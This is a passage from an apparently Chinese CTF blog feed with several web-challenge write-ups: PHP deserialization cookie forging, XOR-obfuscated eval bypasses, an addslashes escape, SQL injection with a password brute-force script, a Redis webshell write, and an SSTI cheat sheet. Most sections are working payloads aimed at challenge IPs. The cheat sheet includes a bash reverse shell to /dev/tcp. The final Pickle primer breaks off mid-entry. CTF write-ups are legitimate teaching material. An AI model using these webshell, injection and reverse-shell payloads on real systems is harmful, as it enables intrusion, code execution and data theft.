class="line">$class -&gt; forbidden = $class;  <span class="comment">//为了调用__toString</span></span><br><span class="line"><span class="keyword">echo</span> cookie_encode(serialize($class));</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/08/UNCTF-Web-wp/7.png" alt><br>提示有<code>access.php</code>，但是读源码和<code>flag</code>一样被waf了，最后发现有<code>access.php.bak</code><br>最终payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">cookie_encode</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">    $key = base64_encode($str);</span><br><span class="line">    $key = bin2hex($key);</span><br><span class="line">    $arr = str_split($key, <span class="number">2</span>);</span><br><span class="line">    $cipher = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($arr <span class="keyword">as</span> $value) &#123;</span><br><span class="line">        $num = hexdec($value);</span><br><span class="line">        $num = $num + <span class="number">240</span>;</span><br><span class="line">        $cipher = $cipher.<span class="string">'%26'</span>.dechex($num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $cipher;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">session</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $access_token = <span class="string">'3ecReK&amp;key'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$hack_token = <span class="string">"3ecReK&amp;key"</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">debug</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $choose = <span class="string">"2"</span>;</span><br><span class="line">    <span class="keyword">public</span> $forbidden = <span class="string">"Good Luck :|"</span>;</span><br><span class="line">    <span class="keyword">public</span> $access_token = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $ob = <span class="keyword">NULL</span>;</span><br><span class="line">    <span class="keyword">public</span> $username = <span class="string">"debuger"</span>;</span><br><span class="line">    <span class="keyword">public</span> $id = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$class = <span class="keyword">new</span> debug;</span><br><span class="line">$class -&gt; forbidden = $class;</span><br><span class="line">$token = <span class="keyword">new</span> session;</span><br><span class="line">$class -&gt; funny = serialize($token);</span><br><span class="line"><span class="keyword">echo</span> cookie_encode(serialize($class));</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/08/UNCTF-Web-wp/6.png" alt></p>
<h3><span id="bypass">bypass</span></h3><p>payload: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://183.129.189.60:10026/?a=\&amp;b=%0agr$9ep -R ctf%20%23</span><br></pre></td></tr></table></figure>

<h3><span id="smile-dog">Smile Dog</span></h3><p><code>Golang</code><br><code>CVE-2019-9741</code><br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:9527/? HTTP/1.1\r\nLogic: &#123;&#123;.MyRequest&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="新星赛">新星赛</span></h2><h3><span id="simple_web">simple_web</span></h3><p>主要就是绕<code>addslashes()</code><br>题目主要源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$str = addslashes($_GET[<span class="string">'content'</span>]);</span><br><span class="line">$file = file_get_contents(<span class="string">'content.php'</span>);</span><br><span class="line">$file = preg_replace(<span class="string">'|\$content=\'.*\';|'</span>, <span class="string">"\$content='$str';"</span>, $file);</span><br><span class="line">file_put_contents(<span class="string">'content.php'</span>, $file);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?content=\<span class="string">';@eval($_POST[a]);phpinfo();;//</span></span><br></pre></td></tr></table></figure>

<h2><span id="参考链接">参考链接</span></h2><p><a href="https://xz.aliyun.com/t/6685" target="_blank" rel="noopener">https://xz.aliyun.com/t/6685</a><br><a href="https://xz.aliyun.com/t/6686" target="_blank" rel="noopener">https://xz.aliyun.com/t/6686</a><br><a href="https://xz.aliyun.com/t/6661" target="_blank" rel="noopener">https://xz.aliyun.com/t/6661</a></p>
]]></content>
  </entry>
  <entry>
    <title>Web拟态防御题型初探</title>
    <url>/2020/02/17/Web%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1%E9%A2%98%E5%9E%8B%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h1><span id="web拟态防御题型初探">Web拟态防御题型初探</span></h1><p><a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E7%A9%BA%E9%97%B4%E6%8B%9F%E6%80%81%E9%98%B2%E5%BE%A1/20288376?fr=aladdin" target="_blank" rel="noopener">网络空间拟态防御</a></p>
<h2><span id="例题">例题</span></h2><h3><span id="2019_rctf-calcalcalc">2019_RCTF Calcalcalc</span></h3><p>题目描述</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">We implemented a new-generation calculator here!</span><br><span class="line">With the guidance of Cyber Mimic Defense, we developed this absolutely safe calculator and nobody can break it. The expression will be calculated by three different backends to make sure that the result is absolutely correct.</span><br><span class="line">You can check the [source](https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/calcalcalc) code here.</span><br></pre></td></tr></table></figure>

<p>使用了三种后端：nodejs、php、python,我们输入的参数，会分别进入3种后端进行执行，如果3种后端最后的返回值不同，那么则认定为无效，显示<code>That&#39;s classified information. - Asahina Mikuru</code>。如果返回值一致，认定为安全，则将执行结果返回。<br>题目给了我们后端源码</p>
<h4><span id="python">python</span></h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> bson</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">del</span> __builtins__[<span class="string">'exec'</span>]</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/", methods=["POST"])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calculate</span><span class="params">()</span>:</span></span><br><span class="line">    data = request.get_data()</span><br><span class="line">    expr = bson.BSON(data).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> bson.BSON.encode(&#123;</span><br><span class="line">      <span class="string">"ret"</span>: str(eval(str(expr[<span class="string">'expression'</span>])))</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<h3><span id="2019_0ctf-114514calcalcalc">2019_0CTF 114514calcalcalc</span></h3><h3><span id="2019_de1ctf-9calc">2019_De1ctf 9calc</span></h3>]]></content>
  </entry>
  <entry>
    <title>inctf_web两道题解</title>
    <url>/2019/09/24/inctf-web%E4%B8%A4%E9%81%93%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h1><span id="inctf_web两道题解">inctf_web两道题解</span></h1><h3><span id="web1">web1</span></h3><hr>
<h4><span id="code">code:</span></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $input;</span><br><span class="line">  <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">      <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">  <span class="keyword">unset</span>($blacklist);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille=$_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_file($thisfille))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(file_exists($thisfille))&#123;</span><br><span class="line">    <span class="keyword">if</span>(check())&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>($input);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($ass <span class="keyword">as</span> $hole)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4><span id="解题思路">解题思路</span></h4><p>简单的构造异或和上上篇i春秋的math相似<br>xor_exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">还没写</span><br></pre></td></tr></table></figure>

<h4><span id="payload">payload</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://18.222.93.187/?thisfile=./&amp;input=$d=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);$dd=(&apos;%01&apos;^&apos;%5e&apos;).(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;);$ddd=$$dd;$d($ddd[&apos;a&apos;]);</span><br></pre></td></tr></table></figure>

<p>蚁剑直接getshell</p>
<h3><span id="web2">web2</span></h3><hr>
<h4><span id="code">code:</span></h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$input = $_GET[<span class="string">'input'</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">()</span></span>&#123;</span><br><span class="line">  <span class="keyword">global</span> $input;</span><br><span class="line">  <span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">      <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  $blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/$blacklist/i"</span>, $input))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Do you really you need that?"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">unset</span>($blacklist);</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$thisfille=$_GET[<span class="string">'thisfile'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_file($thisfille))&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"You can't use inner file"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(file_exists($thisfille))&#123;</span><br><span class="line">    <span class="keyword">if</span>(check())&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">"Naaah"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">eval</span>($input);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"File doesn't exist"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">iterate</span><span class="params">($ass)</span></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($ass <span class="keyword">as</span> $hole)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"AssHole"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4><span id="思路">思路</span></h4><p>xor_exp:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$payloads = <span class="string">"phpinfo();"</span>;</span><br><span class="line">$exp1 = <span class="string">""</span>;</span><br><span class="line">$exp2 = <span class="string">""</span>;</span><br><span class="line">$payloads = str_split($payloads,<span class="number">1</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">xor_exp</span><span class="params">($payload)</span></span>&#123;</span><br><span class="line">    $arrAz9 = [<span class="string">"A"</span>, <span class="string">"B"</span>, <span class="string">"C"</span>, <span class="string">"D"</span>, <span class="string">"E"</span>, <span class="string">"F"</span>, <span class="string">"G"</span>, <span class="string">"H"</span>, <span class="string">"I"</span>, <span class="string">"J"</span>, <span class="string">"K"</span>, <span class="string">"L"</span>, <span class="string">"M"</span>, <span class="string">"N"</span>, <span class="string">"O"</span>, <span class="string">"P"</span>, <span class="string">"Q"</span>, <span class="string">"S"</span>, <span class="string">"T"</span>, <span class="string">"U"</span>, <span class="string">"V"</span>, <span class="string">"W"</span>, <span class="string">"X"</span>, <span class="string">"Y"</span>, <span class="string">"Z"</span>,<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>,<span class="string">"d"</span>,<span class="string">"e"</span>,<span class="string">"f"</span>,<span class="string">"g"</span>,<span class="string">"h"</span>,<span class="string">"i"</span>,<span class="string">"j"</span>,<span class="string">"k"</span>,<span class="string">"l"</span>,<span class="string">"m"</span>,<span class="string">"n"</span>,<span class="string">"o"</span>,<span class="string">"p"</span>,<span class="string">"q"</span>,<span class="string">"r"</span>,<span class="string">"s"</span>,<span class="string">"t"</span>,<span class="string">"u"</span>,<span class="string">"v"</span>,<span class="string">"w"</span>,<span class="string">"x"</span>,<span class="string">"y"</span>,<span class="string">"z"</span>,<span class="string">"0"</span>,<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>,<span class="string">"4"</span>,<span class="string">"5"</span>,<span class="string">"6"</span>,<span class="string">"7"</span>,<span class="string">"8"</span>,<span class="string">"9"</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($arrAz9 <span class="keyword">as</span> $i)&#123;</span><br><span class="line">        <span class="keyword">foreach</span> ($arrAz9 <span class="keyword">as</span> $j)&#123;</span><br><span class="line">            <span class="keyword">if</span> ((strval($i) ^ strval($j))===$payload)&#123;</span><br><span class="line">                <span class="comment">#echo strval($i).strval($j);</span></span><br><span class="line">                <span class="keyword">return</span> strval($i).strval($j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span> ($payloads <span class="keyword">as</span> $payload)&#123;</span><br><span class="line">    $exp = str_split(xor_exp($payload),<span class="number">1</span>);</span><br><span class="line">    $exp1 .= $exp[<span class="number">0</span>];</span><br><span class="line">    $exp2 .= $exp[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $exp1.<span class="string">"^"</span>.$exp2;</span><br></pre></td></tr></table></figure>

<h4><span id="payload">payload</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://18.223.159.46/</span><br><span class="line">?thisfile=</span><br><span class="line">&amp;input=$e=(syr^(6).(7).(6));</span><br><span class="line">$c= (taacsyc^(7).(4).(3).(1).(6).(7).(7));</span><br><span class="line">$g=(sqcissqxxsqgeraa^(4).(4).(7).(6).(7).(6).(7).(1).(6).(6).(5).(8).(3).(3).(3).(2));</span><br><span class="line">$v=(rast^(7).(7).(2).(8));</span><br><span class="line">$as = (raasce^(3).(2).(2).(6).(1).(1));</span><br><span class="line">$as($e($c($g())));&amp;a=eval($_POST[&apos;a&apos;]);</span><br></pre></td></tr></table></figure>

<p>POST </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a=$array=array(  </span><br><span class="line"> array(&quot;pipe&quot;,&quot;r&quot;),</span><br><span class="line"> array(&quot;pipe&quot;,&quot;w&quot;),</span><br><span class="line"> array(&quot;pipe&quot;,&quot;w&quot;)</span><br><span class="line"> );$fp = proc_open(&quot;ls&quot;,$array,$pipes);</span><br><span class="line">echo stream_get_contents($pipes[1]);</span><br><span class="line">proc_close($fp);</span><br></pre></td></tr></table></figure>

<hr>
<p>两道题的getshell会再做学习，下面是两环境的disale_functions<br>phpinfo() ==&gt; disable_functions:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,exec,system,shell_exec,popen,passthru,link,symlink,syslog,imap_open,ld,error_log,mail,file_put_contents,scandir,file_get_contents,readfile,fread,fopen,chdir</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>i春秋CTF夺旗赛(第一季)</title>
    <url>/2019/09/16/i%E6%98%A5%E7%A7%8BCTF%E5%A4%BA%E6%97%97%E8%B5%9B-%E7%AC%AC%E4%B8%80%E5%AD%A3/</url>
    <content><![CDATA[<h1><span id="i春秋ctf夺旗赛第一季">i春秋CTF夺旗赛(第一季)</span></h1><hr>
<h2><span id="web">WEB</span></h2><h3><span id="math">math</span></h3><p>2019国赛线上赛的加强版，ban掉了<code>base_convert</code>,<code>dechex</code>无法通过进制转换造出来字母了<br><img src="/2019/09/16/i春秋CTF夺旗赛-第一季/1.png" alt><br><code>mt_rand^23==&gt;_G</code>和<code>rand^75==&gt;ET</code>异或构造出来<code>_G</code>和<code>ET</code><br><img src="/2019/09/16/i春秋CTF夺旗赛-第一季/2.png" alt><br><img src="/2019/09/16/i春秋CTF夺旗赛-第一季/3.png" alt><br>利用PHP的可变变量使得<code>$pi=&quot;_GET&quot;</code>变为<code>$pi=&quot;$_GET</code><br>再利用php的<code>{}</code>内也可执行<br><img src="/2019/09/16/i春秋CTF夺旗赛-第一季/4.png" alt><br><img src="/2019/09/16/i春秋CTF夺旗赛-第一季/5.png" alt><br>异或脚本</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$payload = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>,  <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span> , <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    <span class="keyword">for</span>($k=<span class="number">1</span>;$k&lt;=sizeof($payload);$k++)&#123;</span><br><span class="line">        <span class="keyword">for</span>($i = <span class="number">0</span>;$i &lt; <span class="number">9</span>; $i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt;=<span class="number">9</span>;$j++)&#123;</span><br><span class="line">                $exp = $payload[$k] ^ $i.$j;</span><br><span class="line">                <span class="keyword">echo</span>($payload[$k].<span class="string">"^$i$j"</span>.<span class="string">"==&gt;$exp"</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"&lt;br /&gt;"</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c=$pi=(is_nan^(6).(4)).(rand^(7).(5));$pi=$$pi;$pi&#123;0&#125;($pi&#123;1&#125;)&amp;0=system&amp;1=ls /</span><br></pre></td></tr></table></figure>

<h3><span id="easyphp">easyphp</span></h3><p>源码泄露index.php.bak<br><img src="/2019/09/16/i春秋CTF夺旗赛-第一季/6.png" alt><br>直接构造闭合<code>&#39;);payload//</code><br>payload<code>http://url/?file=.%27)===eval($_POST[&quot;a&quot;]);//</code></p>
<h3><span id="crypto-rsa">crypto-rsa</span></h3><p>i 春秋环境炸裂</p>
<h3><span id="mysql">mysql</span></h3><p>i 春秋环境炸裂<br>前面SQL注入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://39.106.94.18:13004/login.php?username=admin\&amp;passwd=||passwd/**/regexp/**/&quot;1&quot;;%00</span><br></pre></td></tr></table></figure>

<p>爆破密码脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">req = requests.Session()</span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">code = string.ascii_letters + string.digits</span><br><span class="line"><span class="comment">#print(req.get(url).content.decode("utf-8"))</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> code:</span><br><span class="line">        url = <span class="string">'http://39.106.94.18:13004/login.php?username=\&amp;passwd=||passwd/**/regexp/**/"^&#123;&#125;&#123;&#125;";%00'</span>.format(payload,j)</span><br><span class="line">        <span class="comment">#print(req.get(url).content.decode("utf-8"))</span></span><br><span class="line">        <span class="comment">#print(url)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Welcome admin"</span><span class="keyword">in</span> req.get(url).content.decode(<span class="string">"utf-8"</span>):</span><br><span class="line">            payload += j</span><br><span class="line">            print(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>

<h3><span id="redis">redis</span></h3><p>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">config set dir /www</span><br><span class="line">config set dbfilename dkk.php</span><br><span class="line">set shell &quot;&lt;?php eval($_POST[&quot;pass&quot;]) ?&gt;&quot;</span><br><span class="line">访问dkk.php</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>ssti姿势</title>
    <url>/2019/09/21/ssti%E5%A7%BF%E5%8A%BF/</url>
    <content><![CDATA[<h1><span id="ssti绕过姿势">ssti绕过姿势</span></h1><p>py2与py3的<code>payload</code>有所差异在此区别开来<br>（flask框架最新可能默认URL编码了，有、烦</p>
<h2><span id="py2">py2</span></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#125;.__class__.__base__.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&quot;bash -i &gt; /dev/tcp/vps_ip/port 0&gt;&amp;1 2&gt;&amp;1&quot;).read()</span><br><span class="line">?search=&#123;&#123;%27%27.__class__.__mro__[2].__subclasses__()[59]()._module.linecache.os.popen(&apos;cat /flasklight/coomme_geeeett_youur_flek&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="py3">py3</span></h2><p>参考连接:<br><a href="https://www.freebuf.com/articles/system/203208.html" target="_blank" rel="noopener">一文看懂Python沙箱逃逸</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a><br><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BSSTI%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">一篇文章带你理解漏洞之 SSTI 漏洞</a></p>
]]></content>
  </entry>
  <entry>
    <title>初学Python PIckle</title>
    <url>/2020/03/12/%E5%88%9D%E5%AD%A6Python-PIckle/</url>
    <content><![CDATA[<h1><span id="初学python-pickle">初学Python PIckle</span></h1><hr>
<h2><span id="前言">前言</span></h2><p>前几天比赛碰到没学过的知识点了，补一波，自己还是太菜了</p>
<h2><span id="picklepython序列化-反序列化">Pickle：Python序列化、反序列化</span></h2><p>pickle.dumps( ) == 序列化(将一个对象打包成一堆看不懂的字符串)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.text = <span class="string">"admin"</span></span><br><span class="line">        self.data = <span class="number">123456</span></span><br><span class="line">        self.dir = [<span class="string">"CTF"</span>,<span class="string">"egg"</span>,<span class="string">"dkk"</span>]</span><br><span class="line">payload = test()</span><br><span class="line">print(pickle.dumps(payload))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'\x80\x03c__main__\ntest\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00textq\x03X\x05\x00\x00\x00adminq\x04X\x04\x00\x00\x00dataq\x05J@\xe2\x01\x00X\x03\x00\x00\x00dirq\x06]q\x07(X\x03\x00\x00\x00CTFq\x08X\x03\x00\x00\x00eggq\tX\x03\x00\x00\x00dkkq\neub.'</span></span><br></pre></td></tr></table></figure>

<p>pickle.loads( ) == 反序列化 （将一堆看不懂的字符串转化为对象）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> pickletools</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.text = <span class="string">"admin"</span></span><br><span class="line">        self.data = <span class="number">123456</span></span><br><span class="line">        self.dir = [<span class="string">"CTF"</span>,<span class="string">"egg"</span>,<span class="string">"dkk"</span>]</span><br><span class="line">payload = test()</span><br><span class="line">size = pickle.dumps(payload)</span><br><span class="line">print(str(pickle.loads(size).__dict__))</span><br><span class="line"></span><br><span class="line"><span class="comment"># &#123;'text': 'admin', 'data': 123456, 'dir': ['CTF', 'egg', 'dkk']&#125;</span></span><br></pre></td></tr></table></figure>

<p>pickle.loads机制</p>
